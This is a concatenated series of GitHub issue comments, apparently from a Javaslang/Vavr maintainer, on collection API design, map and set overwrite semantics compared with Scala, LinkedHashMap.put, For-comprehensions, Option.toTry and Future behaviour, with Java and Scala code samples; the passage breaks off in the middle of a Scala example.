:-)\nbut wait, I like these interfaces... just kidding ;). @nfekete @Kreinoee true, that's what the (polymorphic) open/closed principle is all about.\n\nInterface specifications can be reused through inheritance but implementation need not be. The existing interface is closed to modifications and new implementations must, at a minimum, implement that interface.\n\nIf an interface is not implemented as described by 'the contract' then it should be considered as a bug, not as a security hole. The same applies to java.util.List. I'm able to implement j.u.List.add(int, T) in a way that contradicts the API spec.\nOur collections are defined to be immutable/persistent. I also question if we should deny the possibility of extension. In an object-oriented world the are numerous, unforeseeable requirements to change the behavior of a type (e.g. proxying, ...).. With this issue we will focus to make the shortcuts safe (see above // <-- PROBLEMATIC) by introducing internal, sealed interfaces.. @Kreinoee good discussion! you are absolutely right. Several Javaslang types need to be adjusted.\nThese are our real interfaces (white background):\n\nThese changes need to be performed:\n\nWe remove Tuple and \u03bb from the public API. Additionally we rename \u03bb to Lambda because of several encoding problems of 3rd party libs in the past.\nThis implies that we remove \u03bb.Memoized from the public API\nWe remove Kind1 from Kind2 (delete)\nEither, Option, Try and Validation need to be abstract classes with private constructor\nWe remove Foldable from the public API, maybe we remove it completely\nBitSet, Iterator, List, Stream and Tree need to be abstract classes with private constructor\nWe remove the Stack interface from the lib. It is just a name and not part of the collection hierarchy. List is a stack by itself.\n\nFurthermore there are more types that should not be extended, i.e. they shouldn't be interfaces:\n\nAPI.Match.Case, API.Match.Pattern\n\nI'm not sure if these types should or should not be interfaces. In Scala they are traits:\n\nFuture, Promise\n\nNote: We still need the Ordered interface to indicate that a collection has a Comparator for the underlying elements.\n\nWe need to be careful with internal (package-private/protected) abstract classes. These exists a bug the hinders us from using method references (see https://github.com/javaslang/javaslang/issues/1326#issuecomment-241142336, http://bugs.java.com/bugdatabase/view_bug.do?bug_id=8141122, http://bugs.java.com/bugdatabase/view_bug.do?bug_id=8068254). See these tweets:\n\n. We already do this in Vavr 1.0.. Note: In TreeTest some disabled tests need to be re-enabled (by removing the overrides):\njava\n@Ignore\n@Override\n@Test\npublic void shouldReturnSameInstanceWhenFilteringEmptyTraversable() {\n    // TODO: remove this overridden method with #1826\n}\n. Tree will be removed in Vavr 1.0.0.\nIt is a collection on its own / it does not fit well into the existing collections type hierarchy.. Solution: Change RedBlackTree.insert()\nBefore:\njava\nstatic <T> Node<T> insert(RedBlackTree<T> tree, T value) {\n    if (tree.isEmpty()) {\n        final Empty<T> empty = (Empty<T>) tree;\n        return new Node<>(RED, 1, empty, value, empty, empty);\n    } else {\n        final Node<T> node = (Node<T>) tree;\n        final int comparison = node.comparator().compare(value, node.value);\n        if (comparison < 0) {\n            final Node<T> newLeft = insert(node.left, value);\n            return (newLeft == node.left)\n                   ? node\n                   : Node.balanceLeft(node.color, node.blackHeight, newLeft, node.value, node.right,\n                    node.empty);\n        } else if (comparison > 0) {\n            final Node<T> newRight = insert(node.right, value);\n            return (newRight == node.right)\n                   ? node\n                   : Node.balanceRight(node.color, node.blackHeight, node.left, node.value, newRight,\n                    node.empty);\n        } else {\n            // DEV-NOTE: Even if there is no _comparison_ difference, the object may not be _equal_.\n            //           To save an equals() call, which may be expensive, we return a new instance.\n            return new Node<>(node.color, node.blackHeight, node.left, value, node.right, node.empty);\n        }\n    }\n}\nAfter:\njava\nstatic <T> Node<T> insert(RedBlackTree<T> tree, T value) {\n    if (tree.isEmpty()) {\n        final Empty<T> empty = (Empty<T>) tree;\n        return new Node<>(RED, 1, empty, value, empty, empty);\n    } else {\n        final Node<T> node = (Node<T>) tree;\n        final int comparison = node.comparator().compare(value, node.value);\n        if (comparison < 0) {\n            final Node<T> newLeft = insert(node.left, value);\n            return (newLeft == node.left)\n                   ? node\n                   : Node.balanceLeft(node.color, node.blackHeight, newLeft, node.value, node.right,\n                    node.empty);\n        } else if (comparison > 0) {\n            final Node<T> newRight = insert(node.right, value);\n            return (newRight == node.right)\n                   ? node\n                   : Node.balanceRight(node.color, node.blackHeight, node.left, node.value, newRight,\n                    node.empty);\n        } else {\n            return node;\n        }\n    }\n}. I've tested how Scala does behave when\n\nadding a value into a Set that is already present\nputting a (key, value) into a Map where the key is present and the value differs\nputting a (key, value) into a Map where the key is present and the value is equal\n\nDepending on the implementation, equality is calculated using the equals() method or the compare() method of the underlying ordering.\nThese are the results:\n| Set | ovewrites equal elements |\n| :------- | :------------------------ |\n| HashSet | no |\n| ListSet | no |\n| TreeSet | no |\n| Map | ovewrites (k,v) whenkey equal, value unequal | ovewrites (k,v)  whenkey equal, value equal | overwrites old keywith new key |\n| :------- | :-------------------------- | :------------------------ | :------------------ |\n| HashMap | yes | no | yes |\n| ListMap | yes (appends) | yes (appends) | yes |\n| TreeMap | yes | yes | yes |\nThere is one anomaly: Despite all other Map implementations, HashMap does not update (key, value) when putting a (key, value) that is already present.\nEspecially this may bite the user when working with the Map interface and it is not clear which implementations is currently used.\n\nTest code (executed as shell script):\n```scala\n!/usr/bin/env scala\nimport scala.collection.immutable._\nval hashSet = HashSet(EqInt(1), EqInt(2), EqInt(3))\nprintln(hashSet + EqInt(4)) // Set(2, 1)\nval listSet = ListSet(EqInt(1), EqInt(2), EqInt(3))\nprintln(listSet + EqInt(4)) // ListSet(1, 2)\nval treeSet = TreeSet(EqInt(1), EqInt(2), EqInt(3))\nprintln(treeSet + EqInt(4)) // TreeSet(2, 1)\nval hashMap = HashMap((EqInt(1), \"a\"), (EqInt(2), \"b\"))\nprintln(hashMap + ((EqInt(3), \"a\"))) // Map(2 -> b, 1 -> a)\nprintln(hashMap + ((EqInt(4), \"d\"))) // Map(4 -> d, 1 -> a)\nval listMap = ListMap((EqInt(1), \"a\"), (EqInt(2), \"b\"))\nprintln(listMap)                     // ListMap(1 -> a, 2 -> b)\nprintln(listMap + ((EqInt(1), \"a\"))) // ListMap(2 -> b, 1 -> a)\nprintln(listMap + ((EqInt(3), \"a\"))) // ListMap(2 -> b, 3 -> a)\nprintln(listMap + ((EqInt(4), \"d\"))) // ListMap(1 -> a, 4 -> d)\nval treeMap = TreeMap((EqInt(1), \"a\"), (EqInt(2), \"b\"))\nprintln(treeMap + ((EqInt(3), \"a\"))) // Map(2 -> b, 3 -> a)\nprintln(treeMap + ((EqInt(4), \"d\"))) // Map(4 -> d, 1 -> a)\n// ----------------------------------------------------------------------------\nclass EqInt (i: Int) extends Ordered[EqInt] {\noverride def compare(that: EqInt): Int = this.hashCode - that.hashCode\ndef canEqual(a: Any) = a.isInstanceOf[EqInt]\noverride def equals(that: Any): Boolean =\n    that match {\n      case that: EqInt => that.canEqual(this) && this.hashCode == that.hashCode\n      case _ => false\n    }\noverride def hashCode: Int = i % 2\noverride def toString: String = s\"$i\"\n}\nobject EqInt {\n  def apply(i: Int) = new EqInt(i)\n}\n```. The Javaslang implementation now acts like this:\n| Set | ovewrites equal elements |\n| :------- | :------------------------ |\n| BitSet | no |\n| HashSet | no |\n| LinkedHashSet | no |\n| TreeSet | no |\n| Map | ovewrites (k,v) whenkey equal, value unequal | ovewrites (k,v)  whenkey equal, value equal | overwrites old keywith new key |\n| :------- | :-------------------------- | :------------------------ | :------------------ |\n| HashMap | yes | yes | yes |\n| LinkedHashMap | yes (appends) | yes (appends) | yes |\n| TreeMap | yes | yes | yes |\n. Well done! ... and fast ;). Now this is a clean solution. Thank you for your previous review!. Thank you!. Great! Many thanks :). @AlparSzabados Thank you!! \ud83e\udd47 . @paplorinc thank you, this is an important change toward Java 9!. I remember that topic popped up a while ago. Before we change it I want to ensure that other immutable implementations act the same. When looking at Java and Scala, there are currently only immutable versions of LinkedHashMap.\n. We align to Scala. Changing the behavior is currently out of scope.. @yuriykulikov ok, we can do that. PR's welcome!. I'm not sure we need to remove the entry if the key is already contained, see newMap = newMap.remove(key);. The put operation should overwrite the entry in the Map. Omitting the remove operation is faster. Right, @ruslansennov ?. For example\njava\n    @Override\n    public LinkedHashMap<K, V> put(K key, V value) {\n        if (contains(key)) {\n            return replaceValue(key, value);\n        } else {\n            final Queue<Tuple2<K, V>> newList = list.append(Tuple.of(key, value));\n            final HashMap<K, V> newMap = map.put(key, value);\n            return new LinkedHashMap<>(newList, newMap);\n        }\n    }\nUpdate: replaceValue calls put \ud83d\ude48=> StackOverflow\njava\n    @Override\n    public LinkedHashMap<K, V> put(K key, V value) {\n        final Queue<Tuple2<K, V>> newList;\n        if (contains(key)) {\n            newList = list.replace(list.find(t -> Objects.equals(t._1, key)).get(), Tuple.of(key, value));\n        } else {\n            newList = list.append(Tuple.of(key, value));\n        }\n        final HashMap<K, V> newMap = map.put(key, value);\n        return new LinkedHashMap<>(newList, newMap);\n    }\n@yuriykulikov @ruslansennov I think we should overwrite an existing entry in each case, even if new value and old value are equal. The objects might be different, depending on the equals implementation!. Idea: More Traversable.replace methods would be nice in order to simplify list.replace(list.find(...), ...):\n\nreplaceIf(Predicate<? super T>, T) - replaces the first occurrence\nreplaceAllIf(Predicate<? super T>, T) - replaces all occurrences\n\nBut that is another issue, ~~I will create one...~~ Mmh, maybe there are too many different use-cases. Also having a Function that transforms the old value to a new value and so on. I think we will leave this new functions away for now.. I have another optimization... please wait a minute. We can fuse the get and the find operations (which are O(n)) by trading them with one Option instance:\njava\n    @Override\n    public LinkedHashMap<K, V> put(K key, V value) {\n        final Queue<Tuple2<K, V>> newList;\n        final Option<Tuple2<K, V>> currentEntry = get(key);\n        if (currentEntry.isDefined()) {\n            newList = list.replace(currentEntry.get(), Tuple.of(key, value));\n        } else {\n            newList = list.append(Tuple.of(key, value));\n        }\n        final HashMap<K, V> newMap = map.put(key, value);\n        return new LinkedHashMap<>(newList, newMap);\n    }. Yes. @ruslansennov but we save a find  on the Queue. Yes. @hamnis what is the specific use-case for greater arity in your JSON lib? JSON itself has no notion for tuples or do you encode lists as tuples and fall back to HList at some point?\nMany users are irritated by a javadoc containing signatures with functions of great arity. Especially when looking at the curried form, the signature spans half a screen. It isn't human-readable any more. Also Java's verbosity hinders us from writing human-readable code for great arities.. @hamnis Thank you for the links. I see, Tuples are needed in Codecs (especially in Iso). However, currently the extraction of JSON objects is bound by the max Tuple arity. If there is Tuple22, you can extract only 22 fields. A better scalable solution would be unbounded, i.e. would allow to extract JSON objects of arbitrary size.\nI've sketched a HList impl here: https://github.com/javaslang/javaslang/issues/237#issuecomment-171659133\nMaybe you could use HList instead of Tuple*?\n\nI will close this issue for now. May Javaslang does also need an HList for greater Tuple arity. I would be really interested if you get practical experience with HList!. @hamnis Bad news - our javaslang-gwt module does not return from build anymore since we bumped arity from 8 to 10. Maybe the GWT compiler is unable to cope with the generics anymore. We need to revert back to arity 8 until the GWT issue is solved, sorry :-/\nMaybe one more reason to test an HList implementation.. I will hold my horses!. @paplorinc I like you suggestion of having a method that defaults to a specific object in the empty case. We know it already from Scala, it's name is orElse.\nThe problem with orElse is, that we need higher-order types in order to define it properly throughout the type hierarchy. For that reason Value does not declare that method. Instead All subtypes of Value (but Traversable) define it. (See also #909)\nCurrently Traversable does not define it because the problem still remains - we can't define a proper method signature that works well throughout the Traversable hierarchy:\n```java\ninterface Traversable extends Value {\n    Traversable orElse(Traversable<? extends T> other);\n}\ninterface Seq extends Traversable {\n    @Override   // v---- does not compile\n    Seq orElse(Seq<? extends T> other);\n}\n```\nWe could create alternate method signatures that 'behave as expected':\n```java\ninterface Traversable extends Value {\nTraversable<T> orElse(Iterable<? extends T> other);\n\nTraversable<T> orElse(Supplier<? extends Iterable<? extends T>> supplier);\n\n}\ninterface Seq extends Traversable {\n@Override\nSeq<T> orElse(Iterable<? extends T> other);\n\n@Override\nSeq<T> orElse(Supplier<? extends Iterable<? extends T>> supplier);\n\n}\n```\nThe implementations look like this:\n```java\nisEmpty() ? ofAll(other) : this;\nisEmpty() ? ofAll(supplier.get()) : this;\n```\nThe use of ofAll ensures, that instances of the correct type are re-used.\n\nNote: Adding additional mkString methods is no viable option for us, it does not scale well. Fixed by @ruslansennov . Great addition, code and tests look good \ud83d\udc4d\ud83c\udffc. Thank you!. Awesome, thank you!. @rdegnan great spot, thank you!. flatMap gets elements out of containers like Try.\nGiven a type Try<T>\n\na Success(t) contains one element t\na Failure(SomeException) contains no element (of type T)\n\nIf you want to learn more about this topic, please search for Algebraic Data Types, Sum Types and Product Types. There are many resources.. Because it is --> eventually <-- computed.\nIt returns None, if it is still computing...\nIt returns Some, if the computation finished. The result may be a Success or a Failure.\nHope that helps.\n. Tip: Use onCompleted() handler for async computations instead of pollong.... concurrent.Future is out of scope, it is removed in Vavr 1.0. Awesome, thank you!. @AlparSzabados many thanks and sorry for the silence - I had flu.... Fixed with #1854 . Done. Thank you for the answer and for using Javaslang. It was already questioned and answered several times. Will close this as duplicate to #1636.\nPlease read http://blog.javaslang.io/the-agonizing-death-of-an-astronaut/\n. Thank you, you are right. There is already an issue for revisiting the spliterator characteristics: #1635 \nWe should implement #1635 instead of fixing this issue directly. However, I will keep this issue open as bug.. @ruslansennov looks great, thank you!. Speedup looks *great*, thank you!. @aryaKetan yes, we have a class called \u03bb.class. It seems to be charset-related.\n@oehme is it possible to set charset to UTF-8 when using the Gradle fatJar task?. @aryaKetan we had a similar issue (#223). The workaround was to set the file.encoding system property, either in the JAVA_OPTS or in the GRADLE_OPTS. See a complete description here. /cc\u00a0@oehme. Stefan created the following issue: gradle/gradle#1363. @aryaKetan I will close this issue because it is not directly related to Javaslang. Thank you for reporting!. @paplorinc Thank you! The GWT compiler 'gwt-dev' internally uses Eclipse Java Development Tools (JDT) resp. Eclipse Compiler for Java (ECJ). My experience with these tools is that there were plenty of type inference bugs in the past. The early versions of JDT for Java 8 let Eclipse completely freeze when opening Javaslang's classes in an editor.\nThere are several issues related to JDT on the GWT issue tracker, maybe this problem is also related to JDT. We should wait for an JDT update and try it again (see https://github.com/gwtproject/gwt/issues/9461#issuecomment-261611288). Maybe we are able to find a minimal example (one file with many generics) that let's the GWT compiler stop working.. @ruslansennov Awesome, thank you! You were faster than me, will see if I have to resolve merge conflicts now \ud83d\ude01 (#1801). \n. Looks good, thank you!. @pivovarit Lazy.filter() can't be lazy, it returns an Option, not a Lazy:\njava\npublic Option<T> filter(Predicate<? super T> predicate) {\n    ...\n}\nWe designed a Lazy value (since version 1.x) in the way that it holds a value that is evaluated only, when accessed. Lazy is not meant to be empty, i.e. it can't be a lazy non-value:\njava\n@Override\npublic boolean isEmpty() {\n    return false;\n}\nHowever, we have getOption() in order to make get() safe (because get() might throw, if Lazy might be empty).\nWe could change the behavior of Lazy (by adding the empty state and making filter lazy) but it will be a breaking/bytecode incompatible change. We need to defer it to 3.0.0.. @pivovarit making filter() lazy looks more consistent to my eyes, so let's do the change in 3.0.0. See #1122 . Note to myself:\n\nmaking filter() lazy looks more consistent to my eyes\n\nThis would be a foolish consistency\nlookMaIGotALazyValue.get()\n\n(the get() call above could throw if we allow a Lazy to be empty)\nEvaluating a lazy value should not produce any unforeseeable surprises. If I should choose a name for an empty lazy it would be 'Null'. It would lead to NoSuchElementException hell.. However, it might be important that filter() returns a Lazy in the case of filtering For comprehensions. (See Scala's FilterMonad). @devinrsmith I think you mean the existing update(index, value) function. Does it work for you?. Great, thank you :). Currently there is only cycle() in Stream, which can be used in conjunction with take() and drop(). Given that you achieve the same as rotate() or shift().\nI'm o.k. with adding rotate() and/or shift(), but we need a clear specification of the API interface. I think it makes sense to add it only to sequential collections, i.e. Seq.. That looks good. I would not throw, instead [rotate|shift]Right(n) should delegate to [rotate|shift]Left(-n) for negative n vice versa. The n % len saves us from out of bounds failures.\nIn this context I would prefer rotate over shift. What we have is a circular shift, so shift (without the circular part) would be confusing here.\n. LGTM, will merge. Thank you, it looks great!. @paplorinc I've thought about it the last days. I think it is an interesting data structure but it has the following disadvantages for us:\n\nIt is rarely used because it has a very special use-case. It is optimized for operations on big texts (like in text editors) but generally most collection instances contain only a few elements. With Javaslang we target \"Making general purpose Java programming more efficient\".\nAdding Rope increases the number of collections, which increases the overall complexity - not only from the viewpoint of the maintainers but also from the user perspective. For \"Average Java-Joe\" it might be not transparent when to use which data structure (Vector<String> vs CharSeq vs Rope). The less collections, the better.\nWe (loosely) align with Scala, which also has not a Rope collection.\n\nI'm still searching an argument that says we urgently need a Rope in Javaslang. But I think it will not make it into the lib.\n. @nfekete I think a Rope is too special for a general purpose collection library.\nFor example we expose only one Tree implementation, a general purpose multi-way tree. But internally we have special trees: RedBlackTree for TreeSet/Map, HashArrayMappedTrie for HashSet/Map and BitMappedTrie for Vector.\nI hope you understand if we do not implement it.. Hi Eric!\nthank you for sharing your use-cases, it is very valuable to hear how Javaslang is used in real world applications.\nI've thought about it and think expressing compositional characteristics on the type system is too much for Java. As you said, Java's type system is not able to express that level of abstraction.\nFrom the designer-viewpoint composed types like TryOptionT do not scale very well for a library like Javaslang. I'm sure that feature requests will follow because there are use-cases for TryFutureT, OptionTryT, ...\n\nI don't want to say just 'no' without having an alternate solution. When looking at your code we see two times flatMap.map flatMap.map. ~~But in fact these are different.~~ Let's take a look at t3:\njava\nTry<Option<String>> t3 = \n    t1.flatMap(o1 ->\n        t2.map(o2 ->\n            o1.flatMap(s1 ->\n                o2.map(s2 -> s1 + s2)\n            )\n        )\n    );\n\nWe have a monadic bind Operation between t1 and t2.\nWe observe a ~~monoidic combine~~ monadic bind Operation between o1 and o2\n\nTowards 2.1.0 we will add more API.For methods (see #1629). Given these, we are able to express t3like this:\njava\nTry<Option<String>> t3 = For(t1, t2).yield(this::combine);\nI would suggest to refactor the code and pull the combine operation out of the flatMap/map cascade:\njava\nOption<String> combine(Option<String> o1, Option<String> o2) {\n    return For(o1 ,o2).yield((s1, s2) -> s1 + s2);\n}\nThe benefits:\n\nWe separate the business logic (how to combine results) from the technical bind (success or failure)\nFor is more readable than a flatMap/map 'christmas tree'\n\nWhat do you think?\n\nHere is the complete test (compiled using Javaslang 2.1.0-alpha):\n| t1  | t2  | t3  | t4  |\n| --- | --- | --- | --- |\n| Failure(error1) | Failure(error2) | Failure(error1) | Failure(error1) |\n| Success(None) | Failure(error2) | Failure(error2) | Failure(error2) |\n| Success(Some(Hello)) | Failure(error2) | Failure(error2) | Failure(error2) |\n| Failure(error1) | Success(None) | Failure(error1) | Failure(error1) |\n| Success(None) | Success(None) | Success(None) | Success(None) |\n| Success(Some(Hello)) | Success(None) | Success(None) | Success(None) |\n| Failure(error1) | Success(Some(World)) | Failure(error1) | Failure(error1) |\n| Success(None) | Success(Some(World)) | Success(None) | Success(None) |\n| Success(Some(Hello)) | Success(Some(World)) | Success(Some(HelloWorld)) | Success(Some(HelloWorld)) |\n```java\nimport javaslang.control.Option;\nimport javaslang.control.Try;\nimport java.util.Objects;\nimport java.util.function.BiFunction;\nimport static javaslang.API.*;\npublic class TryOptionTest {\nprivate static final Error ERR1 = new Err(\"error1\");\nprivate static final Error ERR2 = new Err(\"error2\");\n\nprivate static final Object[][] data = new Object[][] {\n        { Failure(ERR1), Failure(ERR2) },\n        { Success(None()), Failure(ERR2) },\n        { Success(Some(\"Hello\")), Failure(ERR2) },\n        { Failure(ERR1), Success(None()) },\n        { Success(None()), Success(None()) },\n        { Success(Some(\"Hello\")), Success(None()) },\n        { Failure(ERR1), Success(Some(\"World\")) },\n        { Success(None()), Success(Some(\"World\")) },\n        { Success(Some(\"Hello\")), Success(Some(\"World\")) }\n};\n\npublic static void main(String[] args) {\n    new TryOptionTest().run();\n}\n\n@SuppressWarnings(\"unchecked\")\nvoid run() {\n    System.out.println(\"| t1  | t2  | t3  | t4  |\");\n    System.out.println(\"| --- | --- | --- | --- |\");\n    for(Object[] testCase : data) {\n        final Try<Option<String>> t1 = (Try<Option<String>>) testCase[0];\n        final Try<Option<String>> t2 = (Try<Option<String>>) testCase[1];\n        final Try<Option<String>> t3 =\n                t1.flatMap(o1 ->\n                        t2.map(o2 ->\n                                o1.flatMap(s1 ->\n                                        o2.map(s2 -> s1 + s2)\n                                )\n                        )\n                );\n        final Try<Option<String>> t4 = For(t1, t2).yield(this::combine);\n        System.out.printf(\"| %s | %s | %s | %s |\\n\", t1, t2, t3, t4);\n    }\n}\n\nOption<String> combine(Option<String> o1, Option<String> o2) {\n    return For(o1 ,o2).yield((s1, s2) -> s1 + s2);\n}\n\npublic static <T1, T2> ForTry2<T1, T2> For(Try<T1> ts1, Try<T2> ts2) {\n    Objects.requireNonNull(ts1, \"ts1 is null\");\n    Objects.requireNonNull(ts2, \"ts2 is null\");\n    return new ForTry2<>(ts1, ts2);\n}\n\npublic static <T1, T2> ForOption2<T1, T2> For(Option<T1> ts1, Option<T2> ts2) {\n    Objects.requireNonNull(ts1, \"ts1 is null\");\n    Objects.requireNonNull(ts2, \"ts2 is null\");\n    return new ForOption2<>(ts1, ts2);\n}\n\nstatic class ForTry2<T1, T2> {\n\n    final Try<T1> try1;\n    final Try<T2> try2;\n\n    ForTry2(Try<T1> try1, Try<T2> try2) {\n        this.try1 = try1;\n        this.try2 = try2;\n    }\n\n    <R> Try<R> yield(BiFunction<? super T1, ? super T2, ? extends R> f) {\n        Objects.requireNonNull(f, \"f is null\");\n        return try1.flatMap(t1 -> try2.map(t2 -> f.apply(t1, t2)));\n    }\n}\n\nstatic class ForOption2<T1, T2> {\n\n    final Option<T1> option1;\n    final Option<T2> option2;\n\n    ForOption2(Option<T1> option1, Option<T2> option2) {\n        this.option1 = option1;\n        this.option2 = option2;\n    }\n\n    <R> Option<R> yield(BiFunction<? super T1, ? super T2, ? extends R> f) {\n        Objects.requireNonNull(f, \"f is null\");\n        return option1.flatMap(t1 -> option2.map(t2 -> f.apply(t1, t2)));\n    }\n}\n\nstatic class Err extends Error {\n\n    Err(String msg) {\n        super(msg);\n    }\n\n    @Override\n    public String toString() {\n        return getMessage();\n    }\n}\n\n}\n```\n. Note: Above there is no 'monoid combine', I updated the text accordingly.\nJust for the protocol: Option as Monoid would look similar to this (Scala, seen here):\nscala\nimplicit def optionMonoid[A](implicit ev: Semigroup[A]): Monoid[Option[A]] =\n    new Monoid[Option[A]] {\n      def empty: Option[A] = None\n      def combine(x: Option[A], y: Option[A]): Option[A] =\n        x match {\n          case None => y\n          case Some(xx) => y match {\n            case None => x\n            case Some(yy) => Some(ev.combine(xx,yy))\n          }\n        }\n    }. I think we have to close this issue because monad transformers are too much for Javaslang at the moment. I suggest to use For-comprehensions instead.\n@enelson I will wait for your reply before we close it.. Thank you for the kind words, Eric! :-)\nThe work on Javaslang consumes much time and generates no money. But it is so much fun and I am convinced that it is the right direction for Java.\nMost probably some of our slang will eventually make it into the language, like pattern matching. We will remove these then in a future major release. We will see.... Hi @santiagopoli,\nthank you for your question, this is an interesting use-case!\nGenerally, using get() is not a good idea because\n\nit blocks the thread\nit may throw (see get() javadoc)\n\nCurrently there is no better solution than using flatMap/map:\njava\npublic Result getResult() {\n    final Future<Type1> f1 = Future.of(() -> new Type1());\n    final Future<Type2> f2 = Future.of(() -> new Type2());\n    final Future<Type3> f3 = Future.of(() -> new Type3());\n    return f1.flatMap(t1 -> f2.flatMap(t2 -> f3.map(t3 -> new Result(t1, t2, t3))).get();\n}\nI think we can do better. Towards 2.1.0 we will enhance our For-comprehension (see #1629). Then we are able to express it like this:\njava\npublic Result getResult() {\n    return For(\n        Future.of(() -> new Type1()),\n        Future.of(() -> new Type2()),\n        Future.of(() -> new Type3())\n    ).yield(Result::new).get();\n}\nBut we still need some time to get 2.1.0 finished. Don't expect it to come near-time.\nI hope that helps.\n- Daniel\n@santiagopoli @ggalmazor @pasku I updated this post. Before, my getResult() methods returned a Future<Result>, therefore I added a get().\nPersonally I like to return a Future and use the onCompleted(), onSuccess() and onFailure() handlers.. @ggalmazor\n\nIt's always interesting to think about this kind of problems: container types (Future) inside container types (Tuple).\n\nI think it is technically not possible to calculate an 'upper bound' of the component types of a Tuple.\nIt is only possible to calculate an upper bound if we provides types at the method level (but that makes no sense in our context):\njava\npublic <T, T1 extends T, ... Tn extends T> Seq<T> toSeq(T1 t1, ..., Tn tn) { ... }\n(See An Ingenious Workaround to Emulate Union Types in Java)\n\nFollowing this idea:\n1 - Is there any kind of barrier mechanism available for Futures in Javaslang?\n2 - Could we leverage Javaslang's Pattern Matching to solve this problem (destructuring the array of results of each Future)? Does this make any sense?\n\nAd 1) The existing barrier mechanisms require a common type T:\n\nfind()\nfirstCompletedOf()\nfold()\nreduce()\nsequence()\n\nGiven the toSeq() example (see above) we are able to create a barrier function that returns the most common type T of heterogenous Futures T1..Tn. Java's CompletableFuture does return Object.\nAd 2) ~~I see no way pattern matching could help here. But~~ I think the new For-comprehension methods I mentioned above are great to solve this issue.\nUpdate: Pattern matching should work similar to the For-comprehensions in this context but we need an additional Tuple wrapper:\n```java\nfinal Tuple3, Future, Future> tuple = ...;\nMatch(tuple).of(\n    Case(Tuple3(Future($()), Future($()), Future($())), (f1, f2, f3) -> ...)\n);\n```\n@ggalmazor I also updated this post. The pattern matching example was wrong. Javaslang currently has no patterns for Futures.\nOn the left hand of the Case statement we match the Futures: Tuple3(Future($()), Future($()), Future($())).\nOn the right hand we get only the first layer of the object tree, namely the futures. But what we really want is the values of the Futures.\nSo in the end pattern matching does not help us here. For-comprehensions are better.. I will close this issue because I think we can't add new API beside the upcoming For-comprehensions.\nOf course the issue is still open for discussion!. Fixes #1454. @davinkevin Future will get some love after 0.9.0 - soon!. @ruslansennov absolutely right - I've overseen that.\n\nSortedSets have a Comparator\nBitSet has an toInt Function\nMultimaps have a value container\n...\n. @ruslansennov That looks like a good solution! The check isn't costly compared to creating new instances.. I think it currently works fine and a fluent processing is possible:\n\n| Source | Result |\n| --- | --- |\n| Some(\"hi\").toTry() | Success(\"hi\") |\n| None().toTry() | Failure(NoSuchElementException) |\nThere are also conversion methods that allow to provide a custom exception in the empty/failure case:\n| Source | Result |\n| --- | --- |\n| Some(\"hi\").toTry(() -> new Error(\"oh\")) | Success(\"hi\") |\n| None().toTry(() -> new Error(\"oh\")) | Failure(Error(\"oh\")) |\n@Opalo Do you have an example where a fluent processing is not possible? Which of the above cases are not correct in you opinion?. @Opalo I see.\nThe toTry() method works correctly. There is no way to change it without breaking the Monad Laws in the way that the original state of the Option gets lost when converting it to Try.\nMore specifically an empty instance (None) needs to be converted to an empty instance (Failure).\nYou said:\n\nUnfortunately how it's implemented now makes impossible to process given Value fluently.\n\nBut that is not correct. If you comment out the onFailure() handler, the program does not throw. I.e. a fluent processing is possible.\nThe problem is that you throw the IllegalStateException. Or more specifically - you have 'good' errors (image is null) and 'bad' errors (like IOException on copy). But you don't distinguish between them.\nBelow you find an example that distinguishes between the errors. But I suggest to use the if (image != null) you added.\n```java\nimport javaslang.control.Option;\nimport javaslang.control.Try;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.util.List;\npublic class ToTry {\npublic static void main(String[] args) {\n    new ToTry().setImage(null);\n}\n\nstatic final Editable editable = new Editable();\n\nstatic final Logger log = new Logger();\n\npublic void setImage(List<FileUpload> image) {\n        Option\n                .of(image)\n                .filter(fileUploads -> fileUploads.size() == 1)\n                .map(fileUploads -> fileUploads.get(0))\n                .map(fileUpload -> Tuple.of(Try.of(fileUpload::getInputStream), getExtension(fileUpload.getClientFileName())))\n                .map(tuple -> Tuple.of(tuple._1, getImageFilename(tuple._2)))\n                .map(tuple -> Tuple.of(tuple._1, getImagePath(tuple._2)))\n                .toTry(ImageIsNullError::new)\n                .andThenTry(tuple -> deleteIfExists(tuple._2))\n                .andThenTry(tuple -> copy(tuple._1.get(), tuple._2))\n                .onSuccess(tuple -> log.info(\"Image: %s for lawyer: %s uploaded successfully\", tuple._2, editable.getEmail()))\n                .onFailure(err -> {\n                    if (!(err instanceof ImageIsNullError)) {\n                        log.error(\"Error while uploading image for lawyer: {}, err: {}\", editable.getEmail(), err);\n                        throw new IllegalStateException(String.format(\"Error while uploading file for lawyer: %s\", editable.getEmail()), err);\n                    }\n                });\n}\n\nstatic String getImageFilename(String clientFilename) {\n    return \"\";\n}\n\nstatic String getImagePath(String imageFilename) {\n    return \"\";\n}\n\nstatic String getExtension(String fileName) {\n    return \"\";\n}\n\nstatic void deleteIfExists(String fileName) {\n}\n\nstatic void copy(InputStream src, String dst) {\n}\n\nstatic class ImageIsNullError extends NullPointerException {\n}\n\nstatic class FileUpload {\n    String getClientFileName() {\n        return \"\";\n    }\n\n    InputStream getInputStream() throws IOException {\n        return null;\n    }\n}\n\nstatic class Editable {\n\n    String getEmail() {\n        return \"a@bc.de\";\n    }\n}\n\nstatic class Logger {\n\n    void info(String message, Object... args) {\n        System.out.printf(message + \"\\n\", args);\n    }\n\n    void error(String message, Object... args) {\n        System.out.printf(message + \"\\n\", args);\n    }\n}\n\n}\n```\nI think we can close this ticket.. @Opalo You are welcome. Please ask again on any questions!. Task: Provide a Scala example that behaves like the Javaslang example in the way that \"BigF is ok\" will not be printed.\nThe Scala example works because no ExecutionContext shutdown is performed. The second future (the bigF.map(t -> \"BigF is ok\")) has enough time to execute because the program waits 10 seconds.. @sshark I can reproduce it in Scala. There is one difference:\n\nJava's ExecutorService silently does not accept more tasks when shutdown() was called\nScala's ExecutionContext throws an exception when a Future tries to execute new Tasks and the underlying ExecutorService was shutdown\n\nThe following Scala program is equivalent to the Javaslang program (see above). Especially the same ExecutorService is used.\n```scala\nimport scala.concurrent.\nimport scala.util.\nobject FutureTest {\ndef main(args: Array[String]): Unit = {\nval executorService = java.util.concurrent.Executors.newCachedThreadPool()\nimplicit val executionContext = ExecutionContext fromExecutorService executorService\n\nprintln(\"Running...\")\nval sleepMillis = 1500\n\nval bigF: Future[String] = Future {\n    Try(Thread.sleep(sleepMillis))\n    Success(-100).flatMap(t => Try(foo(t))).getOrElse(throw new Error())\n}\n\n// Try { Thread.sleep(sleepMillis + 500) } // #1\n\nbigF.map(t => \"BigF is ok\")\n    .recover { case _ => \"BigF is facing some problem\" }\n    